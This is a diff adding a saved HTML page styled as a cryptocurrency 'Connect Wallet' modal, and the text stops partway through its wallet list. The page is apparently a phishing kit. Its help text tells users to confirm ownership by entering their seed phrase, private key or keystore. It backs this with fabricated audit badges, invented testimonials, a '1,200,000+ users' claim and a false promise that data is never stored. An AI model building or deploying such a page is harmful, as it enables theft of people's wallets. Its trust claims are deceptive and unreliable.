@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)https://m-smartprotocol.pages.dev/index_1 -->
+<html lang="en" data-scrapbook-source="https://web.multidapp-protocol.xyz/overlay.html">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <!-- Updated viewport meta: disable zooming -->
+    <meta name="viewport" content="width=device-width,
+               initial-scale=1.0,
+               minimum-scale=1.0,
+               maximum-scale=1.0,
+               user-scalable=no">
+
+    <title>Connect Wallet Modal</title>
+    <link href="./css2-1.css" rel="stylesheet">
+    <style>
+        /* ===== CSS Variables for Theme ===== */
+
+        /* Prevent Safari & mobile browsers from auto‐zooming small text */
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            -ms-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+        }
+
+        :root {
+            --primary-color: #000;
+            --secondary-color: #333;
+            --text-color: #333;
+            /* Modal background color remains white unless dark mode is enabled */
+            --modal-bg: #fff;
+            --overlay-bg: rgba(0, 0, 0, 0.5);
+            --accent-color: #000;
+            --button-gradient: linear-gradient(145deg, #000, #333);
+            --ripple-color: rgba(0, 0, 0, 0.3);
+            --transition-speed: 0.3s;
+        }
+
+        body.dark-mode {
+            --text-color: #ddd;
+            --modal-bg: #242424;
+        }
+
+        /* Set transparent background so underlying website shows through */
+
+        html,
+        body {
+            background: transparent !important;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            transition: background var(--transition-speed), color var(--transition-speed);
+        }
+
+        /* Fluid Typography for headings */
+
+        h2 {
+            font-size: clamp(1.75rem, 2vw + 1rem, 2.25rem);
+        }
+
+        /* ===== Custom Scrollbar ===== */
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #ccc;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 4px;
+        }
+
+        /* ===== Modal Overlay with Animated Gradient ===== */
+
+        .wallet-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(45deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.6));
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            display: none;
+            /* Will become flex when the modal is open */
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: background var(--transition-speed);
+        }
+
+        @keyframes gradientBG {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* ===== Modal Structure ===== */
+
+        .wallet-modal {
+            position: relative;
+            background: var(--modal-bg);
+            border-radius: 16px;
+            padding: 0;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90%;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+            animation: slideUp 0.3s ease-out;
+            transition: background var(--transition-speed);
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* ===== Modal Toolbar (Header) ===== */
+
+        .modal-toolbar {
+            position: relative;
+            padding: 16px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+            background: var(--modal-bg);
+            z-index: 2;
+        }
+
+        .modal-toolbar button,
+        .modal-toolbar select {
+            padding: 4px 8px;
+            font-size: 14px;
+            border: none;
+            background: var(--primary-color);
+            color: #fff;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+
+        .modal-toolbar button:hover,
+        .modal-toolbar select:hover {
+            background: var(--secondary-color);
+        }
+
+        /* ===== Back Arrow Button ===== */
+
+        .wallet-back {
+            position: absolute;
+            top: 16px;
+            left: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #888;
+            user-select: none;
+            z-index: 3;
+        }
+
+        /* ===== Modal Body (Scrollable) ===== */
+
+        .modal-body {
+            flex-grow: 1;
+            position: relative;
+            overflow-y: auto;
+            padding: 24px;
+        }
+
+        /* ===== Modal Footer (Fixed Exit Button) ===== */
+
+        .modal-footer {
+            padding: 10px;
+            text-align: center;
+            background: var(--modal-bg);
+            border-top: 1px solid #eee;
+            z-index: 2;
+        }
+
+        .modal-footer button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            background: var(--primary-color);
+            color: #fff;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+
+        .modal-footer button:hover {
+            background: var(--secondary-color);
+        }
+
+        /* ===== Overlays for Help, Privacy, Testimonials ===== */
+
+        .overlay-modal {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            color: #cdc6c6;
+            padding: 20px;
+            overflow-y: auto;
+            z-index: 10;
+        }
+
+        .overlay-modal h2 {
+            margin-top: 0;
+        }
+
+        .overlay-modal button {
+            padding: 10px 20px;
+            background: var(--primary-color);
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+
+        .overlay-modal button:hover {
+            background: var(--secondary-color);
+        }
+
+        .testimonials-overlay {
+            display: none;
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            background: var(--primary-color);
+            color: #fff;
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+            z-index: 11;
+            max-width: 300px;
+        }
+
+        .testimonials-overlay h3 {
+            font-size: 18px;
+            margin-top: 0;
+        }
+
+        .testimonials-overlay p {
+            font-size: 14px;
+            margin: 5px 0;
+            font-style: italic;
+        }
+
+        .testimonials-overlay button {
+            margin-top: 10px;
+            background: var(--secondary-color);
+        }
+
+        /* ===== Modal Heading ===== */
+
+        .modal-body h2 {
+            margin: 50px 0 20px;
+            font-size: clamp(1.75rem, 2vw + 1rem, 2.25rem);
+            text-align: center;
+            color: var(--text-color);
+        }
+
+        /* ===== Main Screen (Wallet Options) ===== */
+
+        #mainScreen {
+            padding: 12px;
+        }
+
+        #mainScreen h2 {
+            margin: 10px 0;
+            font-size: 1.75rem;
+        }
+
+        #mainScreen .wallet-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            border: 1px solid #eee;
+            border-radius: 10px;
+            margin-bottom: 8px;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        #mainScreen .wallet-option:active::after {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: var(--ripple-color);
+            animation: ripple 0.6s linear;
+            top: 0;
+            left: 0;
+        }
+
+        #mainScreen .wallet-option:hover {
+            background: #f7f7f7;
+        }
+
+        #mainScreen .wallet-option span {
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            font-size: 16px;
+            color: var(--text-color);
+        }
+
+        #mainScreen .wallet-option img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            object-fit: contain;
+            loading: lazy;
+        }
+
+        /* targets both mainScreen and verificationScreen */
+
+        /* targets both mainScreen and verificationScreen */
+
+        #mainScreen .security-badges,
+        #verificationScreen .security-badges {
+            position: relative;
+            overflow: hidden;
+            padding: 10px 0;
+            text-align: center;
+        }
+
+        #mainScreen .security-badges .badge-track,
+        #verificationScreen .security-badges .badge-track {
+            display: inline-flex;
+            align-items: center;
+            white-space: nowrap;
+            /* don’t wrap—keeps the loop unbroken */
+            will-change: transform;
+            /* GPU hint */
+            transform: translateZ(0);
+            animation: scroll-logos 10s linear infinite;
+        }
+
+        #mainScreen .security-badges .badge-track img,
+        #verificationScreen .security-badges .badge-track img {
+            height: 30px;
+            margin: 0 20px;
+            flex-shrink: 0;
+        }
+
+        @keyframes scroll-logos {
+            0% {
+                transform: translateX(0);
+            }
+            100% {
+                transform: translateX(-50%);
+            }
+        }
+
+        /* Bold "All Wallets" Button */
+
+        #mainScreen .wallet-option.bold-option {
+            background: var(--primary-color);
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 700;
+            padding: 12px 20px;
+            border-radius: 30px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: background 0.3s, box-shadow 0.3s;
+        }
+
+        #mainScreen .wallet-option.bold-option:hover {
+            background: var(--secondary-color);
+            box-shadow: 0 5px 25px rgba(3, 243, 99, 0.5);
+        }
+
+        #mainScreen .wallet-option.bold-option .wallet-icon {
+            font-size: 22px;
+            margin-left: 8px;
+        }
+
+        .note-link {
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: center;
+            color: var(--primary-color);
+            text-decoration: underline;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .note-link:hover {
+            color: var(--secondary-color);
+        }
+
+        /* ===== All Wallets Grid ===== */
+
+        .all-wallets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .wallet-card {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s;
+        }
+
+        .wallet-card:hover {
+            background: #f0f0f0;
+            transform: scale(1.05);
+        }
+
+        .wallet-card img {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 5px;
+            object-fit: contain;
+            loading: lazy;
+        }
+
+        .search-wallet {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0 5px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        /* ===== Loading Screen with 10-sec Duration & Countdown ===== */
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .spinner {
+            border: 6px solid #eee;
+            border-top: 6px solid var(--primary-color);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .progress-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-color);
+            margin-bottom: 8px;
+        }
+
+        .progress-bar {
+            width: 80%;
+            height: 8px;
+            background: #ddd;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 8px;
+        }
+
+        .progress-bar-inner {
+            height: 100%;
+            width: 0%;
+            background: var(--primary-color);
+            transition: width 0.3s ease;
+        }
+
+        .lock-icon {
+            font-size: 48px;
+            color: var(--primary-color);
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.15);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* Countdown timer */
+
+        #countdownTimer {
+            font-size: 16px;
+            color: var(--text-color);
+        }
+
+        /* ===== Verification Screen ===== */
+
+        .verification-screen {
+            text-align: center;
+        }
+
+        .verification-screen h2 {
+            font-size: 26px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .verification-screen p {
+            font-size: 18px;
+            color: #555;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .verification-button {
+            display: inline-block;
+            background: var(--primary-color);
+            color: #fff;
+            padding: 12px 20px;
+            margin: 10px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            text-align: center;
+            cursor: pointer;
+            width: 220px;
+            border: none;
+            transition: transform 0.2s ease;
+        }
+
+        .verification-button:hover {
+            transform: translateX(5px);
+        }
+
+        .verification-button:focus {
+            outline: none;
+        }
+
+        .verification-button span::before {
+            content: "➤";
+            margin-right: 8px;
+            font-size: 20px;
+            animation: bounce 1s infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes bounce {
+            0% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-5px);
+            }
+            100% {
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== Import Screen – Beautified Form ===== */
+
+        #importScreen {
+            background: linear-gradient(135deg, #fdfbfb, #ebedee);
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        #importScreen h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+
+        .import-section {
+            margin: 20px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            text-align: left;
+        }
+
+        .import-section label {
+            font-weight: 700;
+            color: #444;
+        }
+
+        .import-section input,
+        .import-section textarea {
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .import-section input:focus,
+        .import-section textarea:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .import-section button {
+            align-self: center;
+            padding: 12px 28px;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            background: var(--button-gradient);
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s;
+        }
+
+        .import-section button:hover {
+            background: linear-gradient(145deg, var(--secondary-color), #555);
+            transform: scale(1.02);
+        }
+
+        .data-handling {
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        /* ===== Processing Screen ===== */
+
+        .processing-screen {
+            text-align: center;
+            padding: 40px;
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--primary-color);
+        }
+
+        /* ===== Manual Input Modal ===== */
+
+        .manual-input-modal {
+            text-align: center;
+            background: var(--modal-bg);
+            padding: 20px;
+            margin: 10px auto;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .manual-input-modal h3 {
+            font-size: 22px;
+            color: var(--text-color);
+            margin-bottom: 15px;
+        }
+
+        .manual-input-modal input {
+            padding: 12px;
+            width: 80%;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            margin-bottom: 20px;
+            transition: border 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .manual-input-modal input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .manual-input-modal button {
+            padding: 12px 30px;
+            background: var(--button-gradient);
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s;
+        }
+
+        .manual-input-modal button:hover {
+            background: linear-gradient(145deg, var(--secondary-color), #555);
+            transform: scale(1.02);
+        }
+
+        /* prevent mobile auto-zoom on inputs/textareas */
+
+        html {
+            -webkit-text-size-adjust: 100%;
+        }
+
+        /* only bump form controls inside the modal so iOS won’t zoom them */
+
+        .wallet-modal input,
+        .wallet-modal textarea,
+        .manual-input-modal input,
+        .import-section input,
+        .import-section textarea,
+        .import-section button {
+            font-size: 16px;
+        }
+
+        /* ===== Responsive Adjustments for Mobile ===== */
+
+        @media screen and (max-width: 480px) {
+            .wallet-modal {
+                width: 90%;
+                max-width: 90%;
+                padding: 5px;
+                max-height: 90%;
+            }
+            .modal-toolbar button,
+            .modal-toolbar select {
+                font-size: 11px;
+                padding: 2px 4px;
+            }
+            .modal-body h2 {
+                font-size: 1.5rem;
+            }
+            #mainScreen .wallet-option span {
+                font-size: 14px;
+            }
+            #mainScreen .wallet-option img {
+                width: 20px;
+                height: 20px;
+            }
+            .verification-button {
+                font-size: 14px;
+                width: 180px;
+            }
+            /* ===== Fit Verification Screen on Mobile ===== */
+            @media screen and (max-width: 480px) {
+                /* Make the verification screen fill the modal-body */
+                #verificationScreen {
+                    display: flex;
+                    flex-direction: column;
+                    justify-content: space-between;
+                    /* spread header, buttons, badges */
+                    align-items: center;
+                    height: 100%;
+                    box-sizing: border-box;
+                    padding: 8px 12px;
+                    overflow: hidden;
+                    /* no internal scroll */
+                }
+                /* Shrink the heading and description */
+                #verificationScreen h2 {
+                    font-size: 1.5rem;
+                    margin-bottom: 8px;
+                }
+                #verificationScreen p {
+                    font-size: 0.9rem;
+                    margin-bottom: 12px;
+                    text-align: center;
+                    line-height: 1.3;
+                    padding: 0 4px;
+                }
+                /* Stack & tighten the buttons */
+                .verification-button {
+                    width: 80%;
+                    padding: 8px 0;
+                    margin: 4px 0;
+                    font-size: 0.9rem;
+                }
+                /* Shrink and tighten the badge carousel */
+                #verificationScreen .security-badges {
+                    padding: 6px 0;
+                }
+                #verificationScreen .security-badges .badge-track img {
+                    height: 24px;
+                    margin: 0 8px;
+                }
+            }
+            /* keep form controls at 16px so iOS won’t auto-zoom them */
+            .import-section input,
+            .import-section textarea,
+            .manual-input-modal input {
+                font-size: 16px !important;
+            }
+            .manual-input-modal h3 {
+                font-size: 18px;
+            }
+        }
+    </style>
+    <!-- End CSS -->
+</head>
+
+<body>
+    <!-- Modal Overlay (No extra trigger button here) -->
+    <div class="wallet-modal-overlay" id="walletModal" style="display: none;">
+        <div class="wallet-modal">
+            <!-- Back Arrow -->
+            <div id="backBtn" class="wallet-back" tabindex="0" role="button" aria-label="Back" style="display: none;">←</div>
+
+            <!-- Modal Toolbar -->
+            <div class="modal-toolbar">
+                <button id="helpBtn" aria-label="Help">Help</button>
+                <button id="themeToggleBtn" aria-label="Toggle Dark Mode">Dark Mode</button>
+                <select id="languageSelect" aria-label="Select Language">
+          <option value="en" selected="">English</option>
+          <option value="es">Español</option>
+        </select>
+                <button id="privacyBtn" aria-label="Privacy Policy">Privacy</button>
+                <button id="testimonialsBtn" aria-label="User Testimonies">💬</button>
+            </div>
+
+            <!-- Overlays -->
+            <div id="helpOverlay" class="overlay-modal">
+                <h2>Onboarding Tutorial</h2>
+                <p>Welcome to Wallet Connection! This tutorial will guide you through the steps:</p>
+                <ol>
+                    <li>On the Main Screen, select a wallet or use the manual input option.</li>
+                    <li>All Wallets: Browse through all supported wallets.</li>
+                    <li>Manual Input: Enter your wallet name if not listed.</li>
+                    <li>Loading &amp; Verification: Your wallet is securely connected using blockchain simulation.</li>
+                    <li>Import: Confirm wallet ownership by providing your seed phrase, private key, or keystore.</li>
+                </ol>
+                <button>Got It!</button>
+            </div>
+            <div id="privacyOverlay" class="overlay-modal">
+                <h2>Privacy &amp; Data Handling</h2>
+                <p>Your privacy is paramount. All sensitive wallet information is processed locally, encrypted, and never stored.</p>
+                <button>Close</button>
+            </div>
+            <div id="testimonialsOverlay" class="testimonials-overlay">
+                <h3>User Testimonies</h3>
+                <p>"The connection process is fast, secure, and incredibly easy!"</p>
+                <p>"I feel confident using this wallet modal – my data is never at risk."</p>
+                <button>Close</button>
+            </div>
+
+            <!-- Session Timeout Warning -->
+            <div id="sessionWarning" class="overlay-modal" style="top: auto; bottom: 0; left: 50%; transform: translateX(-50%); max-width: 300px; text-align: center; display: none; padding: 10px; font-size: 16px;">
+                Session expires in <span id="sessionCountdown"></span> seconds.
+                <button style="margin-top: 5px;">Stay Connected</button>
+            </div>
+
+            <!-- Security Notification -->
+            <div id="securityNotification" class="security-notification" style="display: none;">🔒 Session is Secure</div>
+
+            <!-- Modal Body -->
+            <div class="modal-body">
+                <!-- Main Screen -->
+                <div id="mainScreen" style="display: block;">
+                    <h2 data-i18n="connect_title">Connect Your Wallet</h2>
+                    <div class="wallet-option" tabindex="0" role="button" aria-label="Connect MetaMask">
+                        <span><img src="./metamask.svg" alt="MetaMask" loading="lazy">MetaMask</span> →
+                    </div>
+                    <div class="wallet-option" tabindex="0" role="button" aria-label="Connect Trust Wallet">
+                        <span><img src="./trustwallet.png" alt="Trust Wallet" loading="lazy">Trust Wallet</span> →
+                    </div>
+                    <div class="wallet-option" tabindex="0" role="button" aria-label="Connect Phantom">
+                        <span><img src="./Phantom(1).png" alt="Phantom" loading="lazy">Phantom</span> →
+                    </div>
+                    <div class="wallet-option" tabindex="0" role="button" aria-label="Connect Solflare">
+                        <span><img src="./solflare.png" alt="Solflare" loading="lazy">Solflare</span> →
+                    </div>
+                    <div class="wallet-option" tabindex="0" role="button" aria-label="Connect Binance">
+                        <span><img src="./binance.png" alt="Binance" loading="lazy">Binance</span> →
+                    </div>
+                    <div class="wallet-option bold-option" tabindex="0" role="button" aria-label="Show All Wallets">
+                        <span data-i18n="all_wallets">All Wallets</span>
+                    </div>
+                    <!-- Note Link for Manual Input -->
+                    <div class="note-link" tabindex="0" role="link" aria-label="Manual wallet input" data-i18n="cant_find_wallet">Can’t find your wallet? Tap here to input manually</div>
+                    <!-- put this inside your #mainScreen -->
+                    <div class="security-badges">
+                        <div class="badge-track" style="">
+                            <!-- First sequence -->
+                            <img src="./certik.png" alt="CertiK Audit">
+                            <img src="./ConsenSysDiligence.png" alt="ConsenSys Diligence">
+                            <img src="./coingecko.png" alt="CoinGecko">
+                            <img src="./coinmarketcap.png" alt="CoinMarketCap">
+                            <img src="./coinsniper.png" alt="CoinSniper">
+                            <img src="./gmgn.png" alt="GMGN">
+                            <img src="./discord.png" alt="Discord">
+                            <img src="./telegram.png" alt="Telegram">
+                            <img src="./reddit.png" alt="Reddit">
+                            <img src="./solana.png" alt="Solana">
+                            <img src="./ethereum.png" alt="Ethereum">
+                            <img src="./bitcoin.png" alt="Bitcoin">
+                            <img src="./opensea.png" alt="OpenSea">
+                            <img src="./x.png" alt="X">
+                            <img src="./metamasklogo.png" alt="metamasklogo">
+                            <img src="./phantomlogo.png" alt="phantomlogo">
+                            <!-- Duplicate sequence for seamless loop -->
+                            <img src="./certik.png" alt="CertiK Audit">
+                            <img src="./ConsenSysDiligence.png" alt="ConsenSys Diligence">
+                            <img src="./coingecko.png" alt="CoinGecko">
+                            <img src="./coinmarketcap.png" alt="CoinMarketCap">
+                            <img src="./coinsniper.png" alt="CoinSniper">
+                            <img src="./gmgn.png" alt="GMGN">
+                            <img src="./discord.png" alt="Discord">
+                            <img src="./telegram.png" alt="Telegram">
+                            <img src="./reddit.png" alt="Reddit">
+                            <img src="./solana.png" alt="Solana">
+                            <img src="./ethereum.png" alt="Ethereum">
+                            <img src="./bitcoin.png" alt="Bitcoin">
+                            <img src="./opensea.png" alt="OpenSea">
+                            <img src="./x.png" alt="X">
+                            <img src="./metamasklogo.png" alt="metamasklogo">
+                            <img src="./phantomlogo.png" alt="phantomlogo">
+                        </div>
+                        <div class="trusted-text">Trusted by 1,200,000+ users</div>
+                    </div>
+                </div>
+
+
+                <!-- All Wallets Screen -->
+                <div id="allWalletsScreen" style="display: none;">
+                    <h2 data-i18n="all_wallets">All Wallets</h2>
+                    <input type="text" class="search-wallet" placeholder="Search wallets..." aria-label="Search wallets" value="">
+                    <div class="note-link" tabindex="0" role="link" aria-label="Manual wallet input" data-i18n="cant_find_wallet">Can’t find your wallet? Tap here to input manually</div>
+                    <div class="all-wallets-grid" id="walletGrid">
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect MetaMask">
+                            <img src="./metamask.svg" alt="MetaMask" loading="lazy">
+                            <div>MetaMask</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Rainbow">
+                            <img src="./rainbow.svg" alt="Rainbow" loading="lazy">
+                            <div>Rainbow</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Zengo">
+                            <img src="./zengo.png" alt="Zengo" loading="lazy">
+                            <div>Zengo</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Rabby Wallet">
+                            <img src="./rabbywallet.svg" alt="Rabby Wallet" loading="lazy">
+                            <div>Rabby Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Phantom Wallet">
+                            <img src="./phantomwallet.png" alt="Phantom Wallet" loading="lazy">
+                            <div>Phantom Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Coinbase Wallet">
+                            <img src="./coinbasewallet.png" alt="Coinbase Wallet" loading="lazy">
+                            <div>Coinbase Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Trust Wallet">
+                            <img src="./trustwallet.png" alt="Trust Wallet" loading="lazy">
+                            <div>Trust Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Safepal">
+                            <img src="./safepal.png" alt="Safepal" loading="lazy">
+                            <div>Safepal</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect imToken">
+                            <img src="./imtoken.png" alt="imToken" loading="lazy">
+                            <div>imToken</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect TokenPocket">
+                            <img src="./TokenPocket(1).png" alt="TokenPocket" loading="lazy">
+                            <div>TokenPocket</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Argent">
+                            <img src="./Argent(1).png" alt="Argent" loading="lazy">
+                            <div>Argent</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Safe">
+                            <img src="./safe.png" alt="Safe" loading="lazy">
+                            <div>Safe</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Ledger Live">
+                            <img src="./ledgerlive.png" alt="Ledger Live" loading="lazy">
+                            <div>Ledger Live</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Trezor Wallet">
+                            <img src="./trezorwallet.png" alt="Trezor Wallet" loading="lazy">
+                            <div>Trezor Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Exodus">
+                            <img src="./exodus.svg" alt="Exodus" loading="lazy">
+                            <div>Exodus</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Electrum">
+                            <img src="./electrum.png" alt="Electrum" loading="lazy">
+                            <div>Electrum</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Mycelium">
+                            <img src="./mycelium.png" alt="Mycelium" loading="lazy">
+                            <div>Mycelium</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Armory">
+                            <img src="./armory.png" alt="Armory" loading="lazy">
+                            <div>Armory</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect GreenAddress">
+                            <img src="./greenaddress.png" alt="GreenAddress" loading="lazy">
+                            <div>GreenAddress</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Blockchain Wallet">
+                            <img src="./blockchainwallet.png" alt="Blockchain Wallet" loading="lazy">
+                            <div>Blockchain Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Coinomi">
+                            <img src="./coinomi.png" alt="Coinomi" loading="lazy">
+                            <div>Coinomi</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Edge Wallet">
+                            <img src="./edgewallet.png" alt="Edge Wallet" loading="lazy">
+                            <div>Edge Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect BRD Wallet">
+                            <img src="./brdwallet.png" alt="BRD Wallet" loading="lazy">
+                            <div>BRD Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Samourai Wallet">
+                            <img src="./samouraiwallet.png" alt="Samourai Wallet" loading="lazy">
+                            <div>Samourai Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Wasabi Wallet">
+                            <img src="./wasabiwallet.png" alt="Wasabi Wallet" loading="lazy">
+                            <div>Wasabi Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect ElectrumSV">
+                            <img src="./electrumsv.png" alt="ElectrumSV" loading="lazy">
+                            <div>ElectrumSV</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Bitcoin Core">
+                            <img src="./bitcoincore.png" alt="Bitcoin Core" loading="lazy">
+                            <div>Bitcoin Core</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Copay">
+                            <img src="./copay.png" alt="Copay" loading="lazy">
+                            <div>Copay</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Green Wallet">
+                            <img src="./greenwallet.png" alt="Green Wallet" loading="lazy">
+                            <div>Green Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect BlueWallet">
+                            <img src="./bluewallet.png" alt="BlueWallet" loading="lazy">
+                            <div>BlueWallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Nifty Wallet">
+                            <img src="./niftywallet.png" alt="Nifty Wallet" loading="lazy">
+                            <div>Nifty Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect MetaMask Mobile">
+                            <img src="./metamaskmobile.png" alt="MetaMask Mobile" loading="lazy">
+                            <div>MetaMask Mobile</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Sollet Wallet">
+                            <img src="./solletwallet.png" alt="Sollet Wallet" loading="lazy">
+                            <div>Sollet Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Math Wallet">
+                            <img src="./mathwallet.png" alt="Math Wallet" loading="lazy">
+                            <div>Math Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect BitGo Wallet">
+                            <img src="./bitgowallet.png" alt="BitGo Wallet" loading="lazy">
+                            <div>BitGo Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect BitPay Wallet">
